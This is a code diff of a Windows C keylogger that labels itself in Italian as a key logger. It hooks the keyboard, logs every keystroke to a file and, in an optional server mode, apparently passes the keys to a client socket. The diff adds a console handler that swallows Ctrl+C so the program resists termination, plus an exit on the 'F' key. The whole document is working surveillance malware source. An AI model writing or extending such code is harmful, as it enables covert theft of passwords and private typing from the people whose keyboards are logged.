@@ -19,16 +19,25 @@ FILE *f;
 SOCKET clientSocket;
 int end;
 
-void SignalHandler(int signal)
+void DetachFromConsole()
 {
-    if (signal == SIGINT)
+    // Create a new console for the process if needed
+    if (AllocConsole())
     {
-        printf("I got a signit");
+        freopen("CONOUT$", "w", stdout); // Redirect stdout to the new console
+        freopen("CONIN$", "r", stdin);   // Redirect stdin to the new console
     }
-    else
+}
+
+BOOL CtrlHandler(DWORD fdwCtrlType)
+{
+    // Handle Ctrl-C (SIGINT)
+    if (fdwCtrlType == CTRL_C_EVENT)
     {
-        printf("i got another sing");
+        printf("Caught SIGINT (Ctrl+C), but program will not terminate.\n");
+        return TRUE; // Returning TRUE prevents termination
     }
+    return FALSE; // Pass other control signals to the default handler
 }
 
 LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
@@ -41,7 +50,10 @@ LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
         // Print the key code (note: %c may not work for all key codes)
         printf("Tasto premuto: %c (Codice VK: %lu)\n", (char)vkCode, vkCode);
         fputc((char)vkCode, f); // Cast to char to avoid unexpected output
-
+        if ((char)vkCode == 'F')
+        {
+            end = 1;
+        }
 #if SERVER_MODE
         int iResult;
         char buf[16];
@@ -167,11 +179,15 @@ SOCKET CreateSocket(void)
 int main(int argc, char *argv[])
 {
     end = 0;
-
-    typedef void (*SignalHandlerPointer)(int);
-
-    SignalHandlerPointer previousHandler;
-    previousHandler = signal(SIGINT, SignalHandler);
+// DetachFromConsole();
+// Set the control handler to handle SIGINT (Ctrl+C)
+#if NOT_ENDING
+    if (!SetConsoleCtrlHandler((PHANDLER_ROUTINE)CtrlHandler, TRUE))
+    {
+        printf("Error: Unable to set control handler.\n");
+        return 1;
+    }
+#endif
 
     printf("Inizializzazione key logger...\n");
 
